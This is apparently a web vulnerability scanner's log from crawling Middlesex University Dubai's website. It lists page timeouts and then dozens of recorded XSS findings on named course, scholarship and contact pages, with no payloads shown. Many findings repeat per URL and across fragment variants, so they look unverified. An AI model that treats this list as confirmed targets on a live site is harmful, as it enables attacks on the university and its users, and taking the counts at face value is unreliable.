+2025-04-13 18:24:14,950 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/about-us/honorary-doctorates/misho-ravic: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/about-us/honorary-doctorates/misho-ravic", waiting until "networkidle"
+
+2025-04-13 18:24:14,955 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/research/research-matters
+2025-04-13 18:24:20,872 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/about-us/our-people/staff-detail/faisal-nazir-zargar
+2025-04-13 18:24:25,617 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-marketing
+2025-04-13 18:24:30,504 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/opendays
+2025-04-13 18:24:35,403 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/research/research-seminar-series/2022
+2025-04-13 18:24:39,092 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/isd
+2025-04-13 18:24:52,224 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/about-us/honorary-doctorates/his-excellency-dr-ali-saeed-bin-harmal-al-dhaheri
+2025-04-13 18:25:22,243 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/about-us/honorary-doctorates/his-excellency-dr-ali-saeed-bin-harmal-al-dhaheri: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/about-us/honorary-doctorates/his-excellency-dr-ali-saeed-bin-harmal-al-dhaheri", waiting until "networkidle"
+
+2025-04-13 18:25:22,243 - WebSecScanner - INFO - [Crawl] Visiting: https://api.mdx.ac.ae/uploads/research_matters_fourth_volume_march_a0ca424527.pdf?updated_at=2022-08-21T08:53:03.882Z
+2025-04-13 18:25:23,068 - WebSecScanner - DEBUG - Error JS crawling https://api.mdx.ac.ae/uploads/research_matters_fourth_volume_march_a0ca424527.pdf?updated_at=2022-08-21T08:53:03.882Z: Page.goto: net::ERR_ABORTED at https://api.mdx.ac.ae/uploads/research_matters_fourth_volume_march_a0ca424527.pdf?updated_at=2022-08-21T08:53:03.882Z
+Call log:
+  - navigating to "https://api.mdx.ac.ae/uploads/research_matters_fourth_volume_march_a0ca424527.pdf?updated_at=2022-08-21T08:53:03.882Z", waiting until "networkidle"
+
+2025-04-13 18:25:23,069 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/mdx-english-language-for-specific-purposes
+2025-04-13 18:25:28,310 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/mdx-tailored-camps-and-immersion-trips
+2025-04-13 18:25:58,325 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/mdx-tailored-camps-and-immersion-trips: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/mdx-tailored-camps-and-immersion-trips", waiting until "networkidle"
+
+2025-04-13 18:25:58,341 - WebSecScanner - INFO - [Crawl] Visiting: http://www.mdx.ac.ae/courses/school-of-law/politics-and-international-relations
+2025-04-13 18:26:04,277 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/juris#ADVISORY%20BOARD
+2025-04-13 18:26:08,405 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/contact-us/regional-offices
+2025-04-13 18:26:38,425 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/contact-us/regional-offices: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/contact-us/regional-offices", waiting until "networkidle"
+
+2025-04-13 18:26:38,426 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/student-services
+2025-04-13 18:27:08,440 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/student-services: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/student-services", waiting until "networkidle"
+
+2025-04-13 18:27:08,440 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/news/annual-for-the-love-of-the-planet-festival-celebrates-sustainability
+2025-04-13 18:27:13,648 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/honorary-doctorates/2023
+2025-04-13 18:27:18,401 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/about-us/news/news-detail/2018/11/29/corporate-social-responsibility-masterclass-invites-private-sector-to-celebrate-the-year-of-zayed
+2025-04-13 18:27:48,429 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/about-us/news/news-detail/2018/11/29/corporate-social-responsibility-masterclass-invites-private-sector-to-celebrate-the-year-of-zayed: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/about-us/news/news-detail/2018/11/29/corporate-social-responsibility-masterclass-invites-private-sector-to-celebrate-the-year-of-zayed", waiting until "networkidle"
+
+2025-04-13 18:27:48,477 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/europe
+2025-04-13 18:27:59,235 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance
+2025-04-13 18:28:03,363 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/about-us/our-people/staff-detail/vaishali-raj-sharma
+2025-04-13 18:28:33,449 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/about-us/our-people/staff-detail/vaishali-raj-sharma: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/about-us/our-people/staff-detail/vaishali-raj-sharma", waiting until "networkidle"
+
+2025-04-13 18:28:33,493 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/bsc-honours-business-computing-and-data-analytics
+2025-04-13 18:28:39,531 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism
+2025-04-13 18:28:45,160 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/mohesr-license
+2025-04-13 18:29:15,177 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/mohesr-license: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/mohesr-license", waiting until "networkidle"
+
+2025-04-13 18:29:15,177 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/news/new-recycling-programme-in-partnership-with-enviroserve-launched-at-middlesex-university-dubai
+2025-04-13 18:29:45,237 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/news/new-recycling-programme-in-partnership-with-enviroserve-launched-at-middlesex-university-dubai: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/news/new-recycling-programme-in-partnership-with-enviroserve-launched-at-middlesex-university-dubai", waiting until "networkidle"
+
+2025-04-13 18:29:45,260 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/life-at-university/ces
+2025-04-13 18:29:51,852 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/news/mdx-mun-society-participate-in-future-we-want-model-un-conference-2025
+2025-04-13 18:30:21,863 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/news/mdx-mun-society-participate-in-future-we-want-model-un-conference-2025: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/news/mdx-mun-society-participate-in-future-we-want-model-un-conference-2025", waiting until "networkidle"
+
+2025-04-13 18:30:21,865 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems
+2025-04-13 18:30:29,208 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/about-us/our-people/staff-detail/nishtha-lamba
+2025-04-13 18:30:35,964 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#PROGRAMME%20MODULES
+2025-04-13 18:30:41,508 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-counselling-skills
+2025-04-13 18:30:45,461 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism#COURSE%20OVERVIEW
+2025-04-13 18:30:51,322 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#
+2025-04-13 18:30:57,730 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/cop28
+2025-04-13 18:31:27,749 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/cop28: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/cop28", waiting until "networkidle"
+
+2025-04-13 18:31:27,749 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#BA%20HONOURS%20BUSINESS%20MANAGEMENT%20FINANCE
+2025-04-13 18:31:32,373 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/europe#
+2025-04-13 18:31:39,465 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/socialclubs
+2025-04-13 18:31:42,832 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/research/research-seminar-series/2025
+2025-04-13 18:31:47,467 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime#wide_rich
+2025-04-13 18:32:17,487 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime#wide_rich: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime#wide_rich", waiting until "networkidle"
+
+2025-04-13 18:32:17,488 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/cipd-certificate#HOW_TAUGHT
+2025-04-13 18:32:47,497 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/cipd-certificate#HOW_TAUGHT: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/cipd-certificate#HOW_TAUGHT", waiting until "networkidle"
+
+2025-04-13 18:32:47,497 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/about-us/news/2025
+2025-04-13 18:33:17,520 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/about-us/news/2025: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/about-us/news/2025", waiting until "networkidle"
+
+2025-04-13 18:33:17,521 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/event/wednesday-research-seminar-series-a-virtual-reality-technique-to-enhance-helping-behaviour-of-police-toward-a-victim-of-police-racial-aggression
+2025-04-13 18:33:22,000 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-information-technology
+2025-04-13 18:33:29,907 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/mba-daytime-delivery-student-information
+2025-04-13 18:33:34,360 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/about-us/news/news-detail/2020/12/16/the-2nd-t-shirt-design-competition-@-mdx-dubai-has-been-run-and-won-for-2020!
+2025-04-13 18:34:04,371 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/about-us/news/news-detail/2020/12/16/the-2nd-t-shirt-design-competition-@-mdx-dubai-has-been-run-and-won-for-2020!: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/about-us/news/news-detail/2020/12/16/the-2nd-t-shirt-design-competition-@-mdx-dubai-has-been-run-and-won-for-2020!", waiting until "networkidle"
+
+2025-04-13 18:34:04,372 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/about-us/our-people/staff-detail/andrew-mackenzie
+2025-04-13 18:34:08,034 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/summer-camp
+2025-04-13 18:34:35,211 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/centres-of-excellence
+2025-04-13 18:35:05,227 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/centres-of-excellence: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/centres-of-excellence", waiting until "networkidle"
+
+2025-04-13 18:35:05,228 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/news/dhl-honorary-certificate-presentation
+2025-04-13 18:35:35,246 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/news/dhl-honorary-certificate-presentation: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/news/dhl-honorary-certificate-presentation", waiting until "networkidle"
+
+2025-04-13 18:35:35,247 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#FACULTY
+2025-04-13 18:35:44,967 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/admissions
+2025-04-13 18:36:15,087 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/admissions: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/admissions", waiting until "networkidle"
+
+2025-04-13 18:36:15,088 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.ae/about-us/our-people/staff-detail/supriya-kunnath-kaitheri
+2025-04-13 18:36:45,107 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.ae/about-us/our-people/staff-detail/supriya-kunnath-kaitheri: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.ae/about-us/our-people/staff-detail/supriya-kunnath-kaitheri", waiting until "networkidle"
+
+2025-04-13 18:36:45,281 - WebSecScanner - INFO - Crawling completed. Found 100 endpoints and 19 forms
+2025-04-13 18:36:45,290 - WebSecScanner - INFO - Starting security scans
+2025-04-13 18:36:45,291 - WebSecScanner - INFO - Scanning for XSS vulnerabilities
+2025-04-13 18:37:03,267 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/scholarships-and-grants
+2025-04-13 18:37:08,627 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/scholarships-and-grants
+2025-04-13 18:37:14,519 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/scholarships-and-grants
+2025-04-13 18:37:19,822 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/scholarships-and-grants
+2025-04-13 18:37:25,507 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/scholarships-and-grants
+2025-04-13 18:37:31,257 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime
+2025-04-13 18:37:36,938 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime
+2025-04-13 18:37:42,995 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime
+2025-04-13 18:37:49,239 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime
+2025-04-13 18:37:55,112 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime
+2025-04-13 18:38:00,887 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime#pathway
+2025-04-13 18:38:06,802 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime#pathway
+2025-04-13 18:38:12,677 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime#pathway
+2025-04-13 18:38:18,187 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime#pathway
+2025-04-13 18:38:23,777 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime#pathway
+2025-04-13 18:38:28,979 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/call-back
+2025-04-13 18:38:34,366 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/call-back
+2025-04-13 18:38:39,352 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/call-back
+2025-04-13 18:38:44,432 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/call-back
+2025-04-13 18:38:49,727 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/call-back
+2025-04-13 18:38:54,862 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-marketing
+2025-04-13 18:39:00,007 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-marketing
+2025-04-13 18:39:05,837 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-marketing
+2025-04-13 18:39:11,547 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-marketing
+2025-04-13 18:39:16,883 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-marketing
+2025-04-13 18:39:22,414 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/europe
+2025-04-13 18:39:27,990 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/europe
+2025-04-13 18:39:33,827 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/europe
+2025-04-13 18:39:39,318 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/europe
+2025-04-13 18:39:44,599 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/europe
+2025-04-13 18:39:49,487 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance
+2025-04-13 18:39:54,562 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance
+2025-04-13 18:39:59,975 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance
+2025-04-13 18:40:05,093 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance
+2025-04-13 18:40:10,945 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance
+2025-04-13 18:40:16,532 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/bsc-honours-business-computing-and-data-analytics
+2025-04-13 18:40:22,615 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/bsc-honours-business-computing-and-data-analytics
+2025-04-13 18:40:28,937 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/bsc-honours-business-computing-and-data-analytics
+2025-04-13 18:40:34,735 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/bsc-honours-business-computing-and-data-analytics
+2025-04-13 18:40:40,491 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/bsc-honours-business-computing-and-data-analytics
+2025-04-13 18:40:45,743 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism
+2025-04-13 18:40:51,075 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism
+2025-04-13 18:40:56,329 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism
+2025-04-13 18:41:01,689 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism
+2025-04-13 18:41:06,966 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism
+2025-04-13 18:41:13,230 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems
+2025-04-13 18:41:19,084 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems
+2025-04-13 18:41:24,814 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems
+2025-04-13 18:41:30,615 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems
+2025-04-13 18:41:36,520 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems
+2025-04-13 18:41:42,423 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#PROGRAMME%20MODULES
+2025-04-13 18:41:48,226 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#PROGRAMME%20MODULES
+2025-04-13 18:41:54,321 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#PROGRAMME%20MODULES
+2025-04-13 18:42:00,074 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#PROGRAMME%20MODULES
+2025-04-13 18:42:05,882 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#PROGRAMME%20MODULES
+2025-04-13 18:42:11,904 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-counselling-skills
+2025-04-13 18:42:17,833 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-counselling-skills
+2025-04-13 18:42:23,622 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-counselling-skills
+2025-04-13 18:42:29,575 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-counselling-skills
+2025-04-13 18:42:35,340 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-counselling-skills
+2025-04-13 18:42:40,747 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism#COURSE%20OVERVIEW
+2025-04-13 18:42:45,974 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism#COURSE%20OVERVIEW
+2025-04-13 18:42:51,237 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism#COURSE%20OVERVIEW
+2025-04-13 18:42:56,594 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism#COURSE%20OVERVIEW
+2025-04-13 18:43:01,847 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism#COURSE%20OVERVIEW
+2025-04-13 18:43:07,661 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#
+2025-04-13 18:43:13,586 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#
+2025-04-13 18:43:19,398 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#
+2025-04-13 18:43:25,266 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#
+2025-04-13 18:43:31,029 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#
+2025-04-13 18:43:36,805 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#BA%20HONOURS%20BUSINESS%20MANAGEMENT%20FINANCE
+2025-04-13 18:43:51,185 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#BA%20HONOURS%20BUSINESS%20MANAGEMENT%20FINANCE
+2025-04-13 18:43:59,087 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#BA%20HONOURS%20BUSINESS%20MANAGEMENT%20FINANCE
+2025-04-13 18:44:05,270 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#BA%20HONOURS%20BUSINESS%20MANAGEMENT%20FINANCE
+2025-04-13 18:44:11,357 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#BA%20HONOURS%20BUSINESS%20MANAGEMENT%20FINANCE
+2025-04-13 18:44:17,716 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/europe#
+2025-04-13 18:44:24,009 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/europe#
+2025-04-13 18:44:30,177 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/europe#
